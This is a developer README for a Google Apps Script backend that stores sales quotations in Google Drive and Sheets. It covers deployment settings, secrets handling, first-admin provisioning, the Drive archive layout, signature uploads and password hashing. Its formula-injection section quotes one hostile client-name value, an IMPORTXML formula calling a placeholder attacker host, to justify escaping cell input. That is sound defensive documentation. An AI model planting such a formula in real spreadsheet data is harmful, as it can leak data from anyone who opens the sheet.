# Google Apps Script backend

The V1 backend. It is the only component that touches Google Drive and Google
Sheets, and the only place secrets exist.

```
React SPA  ──HTTPS POST──▶  Apps Script Web App  ──▶  Google Drive
                                                 └──▶  Google Sheets
```

See `quotation-implementation-plan/IMPLEMENTATION_PLAN.md` §15 for the full
architecture.

---

## Build

```bash
npm run gas:build      # TypeScript → dist-gas/Code.js (+ appsscript.json)
npm run gas:push       # build, then `clasp push`
```

`src/` is TypeScript with real ES modules. esbuild bundles it into a single
`Code.js` and re-exports `doPost` / `doGet` as top-level globals, which is what
Apps Script requires. Never edit `dist-gas/` by hand — it is generated.

The bundle targets **ES2019**, which is what the Apps Script V8 runtime
supports. Do not raise that target.

---

## First-time setup

1. `npm install -g @google/clasp && clasp login`
2. Create the Apps Script project, bound to the **Quotation Tracking**
   spreadsheet.
3. `cp .clasp.json.example .clasp.json` and paste the script id.
   `.clasp.json` is git-ignored — it identifies a live deployment.
4. `npm run gas:push`
5. Deploy as a Web App with the settings below.
6. Set the Script Properties below.

---

## Web App deployment settings

| Setting        | Value                                                   |
| -------------- | ------------------------------------------------------- |
| Execute as     | **Me** (the company account that owns Drive and Sheets) |
| Who has access | **Anyone**                                              |

"Anyone" is required, not preferred: a cross-origin browser `fetch` cannot
complete Google's interactive sign-in, so any other setting makes the SPA
unable to call the backend at all.

**This means the endpoint URL is publicly reachable.** The URL is not a secret
and is not a security boundary. Every non-public action must verify the session
token and the caller's role in `main.ts` _before_ any Drive or Sheets access.
That check is the boundary. See IMPLEMENTATION_PLAN.md §15.1 and §19.

---

## Transport

Requests are CORS **simple requests** — Apps Script cannot answer a preflight:

```
POST <web app /exec URL>
Content-Type: text/plain;charset=utf-8

{"action":"health","requestId":"<uuid>","token":"<session token>","payload":{}}
```

- `application/json` would trigger a preflight. Do not use it.
- An `Authorization` header would trigger a preflight. The token goes in the body.
- Responses are JSON via `ContentService`; HTTP status codes are not
  controllable, so the outcome is carried in the envelope.

Responses:

```jsonc
{ "ok": true,  "requestId": "…", "data": { } }
{ "ok": false, "requestId": "…", "error": { "code": "VALIDATION_FAILED", "message": "…" } }
```

---

## Script Properties

Set these in the Apps Script editor under **Project Settings → Script
Properties**. Never commit a required property, and never expose one to the
frontend.

### Required

| Property                  | Purpose                                                                                         |
| ------------------------- | ----------------------------------------------------------------------------------------------- |
| `SESSION_HMAC_SECRET`     | Signs session tokens. ≥ 32 random bytes.                                                        |
| `PASSWORD_PEPPER`         | Mixed into every password hash, so a leaked spreadsheet alone does not permit offline cracking. |
| `DRIVE_ROOT_FOLDER_ID`    | The `Quotation Archive` folder id.                                                              |
| `TRACKING_SPREADSHEET_ID` | The `Quotation Tracking` spreadsheet id.                                                        |

### Optional (defaults shown)

| Property             | Default           | Purpose                                                    |
| -------------------- | ----------------- | ---------------------------------------------------------- |
| `COMPANY_CODE`       | `SFC`             | Speed Falcon Company                                       |
| `BRANCH_CODE`        | `RUH`             | Riyadh branch                                              |
| `DOC_TYPE_CODE`      | `QTN`             | Quotation                                                  |
| `COMPANY_VAT_NUMBER` | the company's own | Printed on the quotation; resolves `{{company.vatNumber}}` |
| `ALLOWED_ORIGINS`    | _(empty)_         | Defence in depth only — Apps Script cannot enforce CORS.   |

The optional properties are **not secrets.** They are company identifiers that
appear on the quotation itself, which is why they carry committed defaults.
Only the four required properties above are confidential.

`COMPANY_VAT_NUMBER` must be 15 digits, first and last both `3`. A malformed
override is refused and the known-good default is used instead, with a warning
that names the property and never its value — a wrong VAT number on a client's
quotation is a tax-compliance problem, so a typo must not reach a document.

The frontend carries the same number as `VITE_COMPANY_VAT_NUMBER` (see
`.env.example`) so the term preview can resolve the token without a round trip.
**This Script Property is authoritative for generated documents.** A test
asserts the two configurations cannot drift apart.

Together the three codes produce the quotation number `SFC/RUH/QTN/YYYY/###`.
They are configuration rather than literals so a second branch can be added
without a rewrite.

`missingProperties()` reports which required keys are absent, by **name only**.
The `health` action surfaces that so an operator can diagnose a deployment
without any value being disclosed.

---

## Two environments

Maintain **two** deployments, each with its own Script Properties, its own
spreadsheet and its own Drive root:

- **Development** — for all testing. Never points at production data.
- **Production** — the live endpoint.

Deployments are immutable and versioned, so a rollback is re-pointing the
deployment at a previous version rather than re-pushing code.

---

## Creating the first Admin

There is no default account and no self-registration, so the first Admin is
created out of band. It never goes over HTTP: the endpoint is public, and an
unauthenticated "create the first admin" action would be a takeover primitive
for whoever called it first.

Prerequisites: `TRACKING_SPREADSHEET_ID`, `PASSWORD_PEPPER` and
`SESSION_HMAC_SECRET` must already be set. Drive is not needed yet.

1. Generate a strong password (do not reuse one):

   ```bash
   node -e "console.log(require('crypto').randomBytes(18).toString('base64url'))"
   ```

2. In the Apps Script editor, open **Project Settings → Script Properties** and
   add two temporary properties:

   | Property                   | Value                     |
   | -------------------------- | ------------------------- |
   | `BOOTSTRAP_ADMIN_EMAIL`    | the administrator's email |
   | `BOOTSTRAP_ADMIN_PASSWORD` | the password from step 1  |

3. Open the **Editor**, select `runProvisioning` in the function dropdown, and
   press **Run**. Authorise the script if prompted.

4. Read the execution log. Expect:

   ```
   Admin account created for someone@yourcompany.com.
   The bootstrap properties have been deleted. …
   ```

5. Confirm both bootstrap properties are gone from Script Properties. They are
   deleted automatically — _before_ the account is created, so a failure cannot
   leave the password behind — but check anyway.

6. Deliver the password to the person out of band. Never send it in the same
   message as the application URL.

7. Sign in through the web app and confirm the role shows as **Admin**.

`provisionFirstAdmin` refuses to run once any account exists, so it cannot be
used to quietly add a second Admin later. Further accounts go through the
`admin.createUser` action, which requires an existing Admin session.

If you lose the only Admin password: delete that row from the `Users` sheet and
repeat this procedure.

---

## Importing the company's Terms & Conditions

The `Terms` sheet is created empty. It is never seeded automatically — PRD §21
is emphatic that existing terms must not be modified behind the user's back, and
silently populating a library on first load is the same class of surprise.

An Admin loads the company's real terms once, from the application:

1. Sign in as an Admin and open **Terms & Conditions**.
2. Press **Import company terms**.

That runs `admin.importReferenceTerms`, which inserts the 11 terms transcribed
verbatim from `reference/existing-terms.docx`
(`src/terms/import-reference-terms.ts`). It is:

- **Admin only** — enforced by the action table in `main.ts`, not by the button.
- **Idempotent** — a second run imports nothing.
- **Non-destructive** — it inserts only titles that are absent and never edits
  an existing row, so a term someone has since reworded stays reworded.

Two placeholders in the source document were converted to the canonical token
syntax and nothing else was changed:

| In the document | Stored as          | Resolves?             |
| --------------- | ------------------ | --------------------- |
| `{company}`     | `{{company.name}}` | yes                   |
| `{SAR  }`       | `{{rate}}`         | **no — deliberately** |

`{{rate}}` is outside the token whitelist on purpose. A quotation has no single
rate; the approved sample replaced that placeholder by hand with two different
per-category rates. Leaving it unresolvable means the UI flags it and a person
has to supply the real figure, rather than a document going to a client with a
blank where a price belongs.

Four PRD §20 checkbox labels have no counterpart in the reference document —
Mobilization, Manpower Replacement, Project Specific Terms, and Transportation
as a standalone term. Their wording is **not** invented here. The company adds
them through the ordinary "Add term" flow.

---

## The Drive archive

`DRIVE_ROOT_FOLDER_ID` is the one folder that must exist before anything else.
Every other folder is created on first use.

```
Quotation Archive/                     ← DRIVE_ROOT_FOLDER_ID
├── _assets/
│   └── signatures/                    ← created automatically, PRIVATE
├── 2026/
│   ├── January/
│   │   └── SFC-RUH-QTN-2026-001/
│   │       ├── SFC-RUH-QTN-2026-001.pdf
│   │       └── SFC-RUH-QTN-2026-001.docx
│   └── August/
│       └── SFC-RUH-QTN-2026-004/
│           ├── SFC-RUH-QTN-2026-004.pdf
│           └── SFC-RUH-QTN-2026-004.docx
└── _backups/                          (Phase 14)
```

The year and month come from the **quotation date**, never from the clock: a
quotation dated in January and saved in August files under January (PRD §10).
The quotation folder and both filenames carry the exact number the application
issued — never one re-derived from a date or a counter (PRD §5).

### The Advanced Drive Service is required

`appsscript.json` enables it:

```jsonc
"dependencies": { "enabledAdvancedServices": [
  { "userSymbol": "Drive", "serviceId": "drive", "version": "v3" }
] }
```

It is used for exactly one thing: `Drive.Files.update` with media, which
replaces a file's CONTENT in place. DriveApp cannot do that at all — it can only
create another file — and PRD §37 requires that retrying a failed save does not
produce `SFC-RUH-QTN-2026-004 (1).pdf`. Replacing in place also keeps the file
id, the URL already shown to the user, and Drive's own revision history.

Enable it in the editor under **Services → Drive API (v3)** if a deployment
predates this file. Without it, a retry fails with a clear message rather than
silently duplicating.

### Shared Drive, not My Drive

The archive **should** live in a Google Shared Drive so the documents survive
staff changes and are not owned by one personal account (§16.2, §26 UR-15).
That is a deployment decision recorded in Phase 14; the code works either way.

### Nothing is ever made public

Files inherit the archive's permissions. The backend never calls a sharing API,
never sets `ANYONE_WITH_LINK`, and returns only `webViewLink` — the page a
person who already has access can open. Tests assert the Drive fake records zero
sharing calls.

### Payload sizes, measured

Documents travel as base64 in the same `text/plain` POST as every other action
(a second transport would trigger a CORS preflight Apps Script cannot answer).
Measured with the real generators against the real letterhead:

| Quotation                 | PDF    | DOCX   | Combined base64 |
| ------------------------- | ------ | ------ | --------------- |
| 1 line                    | 519 KB | 629 KB | 1.50 MB         |
| 30 lines                  | 530 KB | 630 KB | 1.51 MB         |
| 120 lines                 | 565 KB | 634 KB | 1.56 MB         |
| 500 lines (the ceiling)   | 708 KB | 646 KB | 1.76 MB         |

Both files are dominated by the letterhead and the seal, so size barely grows
with line count. The server caps each file at 5 MB and the request at 10 MB —
comfortable against a ~50 MB practical POST limit.

---

## The quotation register

`TRACKING_SPREADSHEET_ID` points at the **Quotation Tracking** spreadsheet. The
`Quotations` sheet is created on first use; nothing has to exist in advance, and
**no sample row is ever written** (PRD §34).

Columns A–H are exactly PRD §31, in the PRD's order. I–Q are system columns —
they may be hidden and carry no business meaning of their own.

| Col | Header | Source |
| --- | ------------------ | ---------------------------------------------- |
| A | Quotation No. | canonical `SFC/RUH/QTN/YYYY/NNN` — the unique key |
| B | Date | quotation date, `DD-MM-YYYY`, as the document prints it |
| C | Client Name | |
| D | Company Name | |
| E | Quotation For | |
| F | Total Amount | **server-computed** grand total, SAR |
| G | Status | `Pending` \| `Approved` \| `Rejected`, default `Pending` |
| H | Drive Folder | `HYPERLINK` to the quotation folder |
| I | PDF URL | Drive `webViewLink` |
| J | DOCX URL | Drive `webViewLink` |
| K | Subtotal | server-computed |
| L | VAT Amount | server-computed |
| M | Authorized Person | snapshot name |
| N | Created By | user email |
| O | Created At | ISO 8601 UTC, written once |
| P | Updated At | ISO 8601 UTC, moves on every write |
| Q | Draft ID | idempotency key — what makes a re-save update in place |

### Staff may edit Status in the Sheet

That is the V1 tracking mechanism (PRD §31, §17.5), and the app is built around
it: a re-save **preserves** the current Status, so re-issuing a document never
resets an `Approved` quotation to `Pending`, and the quotations list reads Status
back from the Sheet rather than from its own copy.

Two things follow. A Status typed by hand outside the three allowed values is a
typed error on read, not something silently coerced — the row is skipped and
logged rather than shown as `Pending`. And the column carries data validation so
the typo is hard to make in the first place.

### Uniqueness, in three layers

1. The `Counters` sheet is the only issuer of a number (§7.4).
2. A pre-append scan of column A rejects a number already held by a different
   `Draft ID`, with `DUPLICATE_QUOTATION_NUMBER`. The scan and the append run in
   ONE script lock, or two concurrent saves can both pass the check.
3. A conditional-format rule highlights any duplicate introduced by hand.

### Formula injection

Every written value is escaped: a leading `=`, `+`, `-` or `@` gets a `'`
prefix, so a client called `=IMPORTXML("https://attacker.example",…)` lands as
inert text instead of running when someone opens the sheet.

This is enforced by the TYPE SYSTEM, not by convention: `writeRow` accepts only
`PreparedCell`, and the only way to obtain one is through `cell-escaping.ts`.

The single formula this system writes is the Drive Folder `HYPERLINK`, built
from a URL that must match `^https://drive\.google\.com/` with both arguments
escaped. Anything else is written as plain text.

### Cost per save

Four `getRange` round trips, **constant regardless of how many rows the register
holds** — two column scans, one `setValues` for the whole row, one read-back to
confirm it landed. The row is written in a single call so it cannot half-succeed.

Wall-clock against a real spreadsheet cannot be measured from this repository
(the tests use an in-memory fake); what the fake does establish is that the cost
does not grow with the register, which is the property that matters against the
6-minute execution limit.

### When the register write fails

The documents are already in Drive at that point, so PRD §37 treats it as a
WARNING, not a failed save. The upload response carries a `tracking` outcome, the
UI shows "Saved to Drive, but not yet in the register", and **Retry Tracking**
calls `quotation.recordTracking` — which re-reads the archive for the URLs and
writes the row without re-sending two megabytes of documents.

---

## Signature images

`_assets/signatures/` is created on first upload, through the same folder
resolver the quotation archive uses — one get-or-create utility, so `_assets`
cannot be duplicated by a second implementation of "look it up, then create it".

**The repository contains no signature file, and never will.** The library ships
empty. An Admin uploads real signatures through the Authorized Persons page once
the company supplies them.

What the server enforces on upload (PRD §33 item 14):

| Check      | Rule                                                                         |
| ---------- | ---------------------------------------------------------------------------- |
| Format     | PNG **magic bytes**, not the MIME type or the filename extension             |
| Size       | ≤ 1 MB                                                                       |
| Dimensions | 100–10,000 px wide; below 600 px is accepted with a warning                  |
| Filename   | Sanitised to `[A-Za-z0-9._-]`; the stored name is derived from the person id |

A PNG with no alpha channel is **accepted with a warning**, not refused. It is a
valid image, and cropping or background removal is the company's decision — but
it will paint a white box over the letterhead, so the warning says exactly that.

Two properties of the storage matter more than the rest:

- **Nothing is ever shared.** No `setSharing`, no `getDownloadUrl`, no public
  link. `persons.getSignature` — authenticated, returning base64 — is the only
  route out of Drive, and a test asserts no sharing call is made.
- **Replacing a signature writes a NEW file.** The superseded file stays in
  Drive, so a quotation issued last month still resolves to the image it was
  actually signed with.

An authorized person is **not** a login account. `AuthorizedPersons` and `Users`
are separate sheets with no shared key: a row here grants no access, and a user
account signs nothing.

---

## Password hashing — measure before go-live

`hashPassword` uses PBKDF2-HMAC-SHA256 with a per-user salt, a per-record
iteration count, and a server-side pepper.

`Utilities.computeHmacSha256Signature` is a host bridge call, so it is far
slower than a native PBKDF2. **`DEFAULT_PBKDF2_ITERATIONS` (currently 10,000) is
a starting point, not a measured value.** Before go-live:

1. Open the Apps Script editor on the real deployment.
2. Run `measurePasswordHashCost()` and read the log.
3. Set the highest count that keeps a login under ~1.5 s.
4. Record the measurement here.

The count is stored per user record, so raising it later is safe: an existing
hash verifies at its own count and is transparently re-hashed at the new one on
that user's next sign-in.

The pepper is the strongest of the three defences: an attacker who exfiltrates
the `Users` sheet cannot mount an offline attack without also compromising the
Apps Script project, where the pepper lives.

Credential material is stored as **lowercase hex, not base64**. Every sheet
write passes through `escapeForSheet`, which prefixes an apostrophe to a value
starting with `=`, `+`, `-` or `@`; base64 can start with `+` or `/`, so a hash
could be stored altered and then fail to verify — intermittently, depending on
the random salt.

---

## Phase status

| Phase       | Adds                                                                                  |
| ----------- | ------------------------------------------------------------------------------------- |
| 01 _(done)_ | Router, envelope, role table, Script Property accessors, `health`                     |
| 02 _(done)_ | Sessions, password hashing, `resolveCaller`, rate limiting, audit log                 |
| 03 _(done)_ | Quotation numbering (`LockService` + `Counters` + idempotency), quotation persistence |
| 04 _(done)_ | `Items` sheet and the item catalogue actions                                          |
| 05 _(done)_ | `Terms` sheet, the T&C actions, and `admin.importReferenceTerms`                      |
| 06 _(done)_ | `AuthorizedPersons` sheet, signature upload, private Drive `_assets/signatures/`      |
| 10          | Drive folders and uploads                                                             |
| 11          | Sheets tracking                                                                       |
| 12          | Security hardening                                                                    |
| 14          | Backups, monitoring, deployment                                                       |
